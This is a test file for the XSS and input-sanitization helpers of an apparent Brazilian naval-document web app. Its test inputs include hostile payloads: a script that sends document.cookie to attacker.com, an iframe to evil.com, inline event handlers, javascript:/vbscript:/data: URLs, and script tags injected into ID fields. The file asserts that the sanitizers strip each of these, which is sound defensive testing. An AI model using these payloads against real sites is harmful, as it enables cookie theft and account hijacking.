import { describe, it, expect } from "vitest";
import {
  sanitizeDocumentHtml,
  sanitizeUrl,
  sanitizeInputString,
} from "@/lib/security/xssDefense";
import { sanitizeSearchQuery, sanitizePlainText, sanitizeAlphaNumeric } from "@/lib/sanitization";

describe("Security Hardening & XSS Defense Integration Suite", () => {
  describe("1. DOMPurify Document HTML Sanitization", () => {
    it("remove tags perigosas de script e iframe em conteúdos de template", () => {
      const maliciousHtml = `
        <h1>Requerimento Naval</h1>
        <p>Texto legítimo</p>
        <script>window.location='http://attacker.com?c='+document.cookie</script>
        <iframe src="http://evil.com"></iframe>
        <object data="malware.swf"></object>
      `;

      const sanitized = sanitizeDocumentHtml(maliciousHtml);
      expect(sanitized).toContain("<h1>Requerimento Naval</h1>");
      expect(sanitized).toContain("<p>Texto legítimo</p>");
      expect(sanitized).not.toContain("<script");
      expect(sanitized).not.toContain("<iframe");
      expect(sanitized).not.toContain("<object");
      expect(sanitized).not.toContain("attacker.com");
    });

    it("elimina atributos de eventos maliciosos inline (onerror, onload, onclick)", () => {
      const maliciousAttributes = `
        <img src="x" onerror="alert(1)" />
        <a href="https://example.com" onclick="stealData()">Link Seguro</a>
        <div onmouseover="executePayload()">Container</div>
      `;

      const sanitized = sanitizeDocumentHtml(maliciousAttributes);
      expect(sanitized).not.toContain("onerror");
      expect(sanitized).not.toContain("onclick");
      expect(sanitized).not.toContain("onmouseover");
      expect(sanitized).not.toContain("stealData");
    });
  });

  describe("2. Sanitização de Esquemas de URL (Links & Imagens)", () => {
    it("bloqueia esquemas de pseudoprotocolo perigosos (javascript:, vbscript:, data:text/html)", () => {
      expect(sanitizeUrl("javascript:alert(document.cookie)")).toBe("#");
      expect(sanitizeUrl("javascript:/*--></title></style></textarea>*/alert(1)")).toBe("#");
      expect(sanitizeUrl("vbscript:msgbox(1)")).toBe("#");
      expect(sanitizeUrl("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==")).toBe("#");
    });

    it("permite URLs HTTP, HTTPS e links relativos legítimos", () => {
      expect(sanitizeUrl("https://navaldocs.com.br/assinar/123")).toBe("https://navaldocs.com.br/assinar/123");
      expect(sanitizeUrl("http://localhost:5173/processes")).toBe("http://localhost:5173/processes");
      expect(sanitizeUrl("/dashboard/documents")).toBe("/dashboard/documents");
      expect(sanitizeUrl("mailto:contato@navaldocs.com.br")).toBe("mailto:contato@navaldocs.com.br");
    });
  });

  describe("3. Sanitização de Entrada de Dados e Proteção contra SQL ILIKE Injections", () => {
    it("remove caracteres nulos (Null Byte Injection) e tags de texto", () => {
      const dirty = "Nome do Cliente\0 <script>alert(1)</script>";
      expect(sanitizeInputString(dirty)).toBe("Nome do Cliente");
    });

    it("escapa curingas do PostgreSQL LIKE/ILIKE (%) e (_) evitando Wildcard DoS", () => {
      const searchWithWildcards = "Barco % 100_percent \\ test";
      const escaped = sanitizeSearchQuery(searchWithWildcards);
      expect(escaped).toContain("\\%");
      expect(escaped).toContain("\\_");
      expect(escaped).toContain("\\\\");
    });

    it("limita comprimento máximo de termos de busca", () => {
      const hugeString = "a".repeat(500);
      const sanitized = sanitizeSearchQuery(hugeString, 50);
      expect(sanitized.length).toBe(50);
    });

    it("mantém apenas caracteres alfanuméricos válidos em números de TIE/CPF/CNPJ", () => {
      expect(sanitizeAlphaNumeric("381-012345/2026")).toBe("381-012345/2026");
      expect(sanitizeAlphaNumeric("11.222.333/0001-81")).toBe("11.222.333/0001-81");
      expect(sanitizeAlphaNumeric("123<script>alert(1)</script>456")).toBe("123456");
    });
  });
});
